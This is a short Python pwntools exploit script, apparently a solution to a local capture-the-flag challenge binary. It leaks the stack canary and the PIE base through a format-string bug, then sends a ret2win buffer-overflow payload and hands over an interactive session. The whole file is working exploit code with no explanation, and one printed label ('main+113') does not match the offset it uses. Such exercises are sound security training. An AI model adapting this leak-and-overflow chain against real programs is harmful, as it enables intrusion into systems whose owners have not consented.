from pwn import *

context.binary = elf = ELF('/home/kali/Desktop/offsec/prove/09_security/chall', checksec=False)

#PIE, NX, CANARY, FULL RELRO

#ret2win with fs leak for PIE base and canary

fs_canary_idx = 3
main_canary_idx = 27    #corresponds to: info symbol 0x5555555553f7: main+174

canary_offset = 72 # with cyclic pattern, breakpoint before stack check fail, check rax with p/x $rax or info registers rax. print(cyclic_find(0x6161617461616173)): 72

p = process(elf.path)

#leak canary
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Report:\n', f"%{fs_canary_idx}$p".encode())
leak = p.recvline().strip()
canary = int(leak, 16)
print(f"Found canary: {hex(canary)}")

#leak main address
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Report:\n', f"%{main_canary_idx}$p".encode())
leak = p.recvline().strip()
main_174 = int(leak, 16)
print(f"Found main+113 addr: {hex(main_174)}")

elf.address = main_174 - (elf.sym.main + 174)
win = elf.sym.win

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A'*canary_offset,
    p64(canary),
    b'B'*8,
    p64(ret_gadget),
    p64(win),
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Credentials:\n', payload)
p.interactive()